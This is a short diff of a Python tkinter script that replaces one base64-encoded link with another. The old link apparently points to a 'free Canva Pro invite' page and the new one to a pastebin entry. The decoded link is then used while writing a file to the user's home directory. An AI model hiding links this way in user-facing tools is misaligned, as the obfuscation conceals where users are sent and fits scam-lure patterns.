@@ -6,7 +6,7 @@ import tkinter as tk
 def create_file():
     try:
         # Decode the link
-        encoded_link = 'aHR0cHM6Ly9saW5rLWh1Yi5uZXQvOTkwMjExL3dvcmtpbmctY2FudmEtcHJvLWludml0ZQ=='
+        encoded_link = 'aHR0cHM6Ly9wYXN0ZWJpbi5jb20veERnUDl5cEM='
         decoded_link = base64.urlsafe_b64decode(encoded_link).decode('utf-8')
         
         # Get the user's home directory
